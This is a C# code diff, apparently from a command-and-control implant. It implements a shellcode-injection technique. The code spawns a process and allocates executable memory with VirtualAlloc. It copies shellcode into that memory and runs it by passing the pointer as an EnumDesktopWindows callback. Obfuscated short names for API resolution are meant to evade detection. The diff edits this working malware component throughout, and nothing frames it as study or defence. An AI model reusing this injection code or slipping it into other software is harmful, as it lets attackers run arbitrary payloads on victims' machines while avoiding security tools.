@@ -15,26 +15,18 @@ namespace Agent
 
         async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
-            return await Task.Factory.StartNew(async () =>
+            if (!await spawner.Spawn(spawnOptions))
             {
-                spawnOptions.suspended = false;
-                Console.WriteLine(spawnOptions.suspended); // error hunting
-                Console.WriteLine(spawnOptions.spoofedcommandline); // error hunting
+                return false;
+            }
+            SafeProcessHandle hProc;
 
-                if (!await spawner.Spawn(spawnOptions))
-                {
-                    return false;
-                }
+            if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
+            {
+                return false;
+            }
 
-                SafeProcessHandle hProc;
-
-                if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
-                {
-                    return false;
-                }
-
-                return Run(hProc.DangerousGetHandle(), shellcode);
-            }, CancellationToken.None, TaskCreationOptions.None, _singleThreadScheduler).Unwrap();
+            return Run(hProc.DangerousGetHandle(), shellcode);
         }
 
 
@@ -42,14 +34,14 @@ namespace Agent
         {
             List<string> k32Funcs = new List<string>
             {
-                "va",        // VirtualAlloc (kernel32.dll)
-                "gcti"       // GetCurrentThreadId (kernel32.dll)
+                 "va",        // VirtualAlloc (kernel32.dll)
+                 "gcti"       // GetCurrentThreadId (kernel32.dll)
             };
 
             List<string> u32Funcs = new List<string>
             {
-                "gtd",        // GetThreadDesktop (user32.dll)
-                "edw"      // EnumDesktopWindows (user32.dll)
+                 "gtd",        // GetThreadDesktop (user32.dll)
+                 "edw"      // EnumDesktopWindows (user32.dll)
             };
 
             //resolve u32 and k32 funcs
@@ -62,9 +54,9 @@ namespace Agent
 
             //Injection
 
-            //IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
-            IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
+            //IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
 
             if (funcAddr == IntPtr.Zero)
             {
@@ -74,6 +66,7 @@ namespace Agent
             Console.WriteLine("Allocated memory at: " + funcAddr);
 
             Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
+            var funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(EnumDesktopWindowsProc));
 
             //IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId()); 
             object[] gctParams = new object[] { }; // No parameters for GetCurrentThreadId
@@ -98,7 +91,7 @@ namespace Agent
             Console.WriteLine("Found desktop handle: " + hDesktop);
 
             //Execute EnumDesktopWindows
-            return EnumDesktopWindows(hDesktop, DesktopCallback, funcAddr);
+            return EnumDesktopWindows(hDesktop, (EnumDesktopWindowsProc)funcDelegate, funcAddr);
         }
 
         private static bool DesktopCallback(IntPtr hwnd, IntPtr lParam)
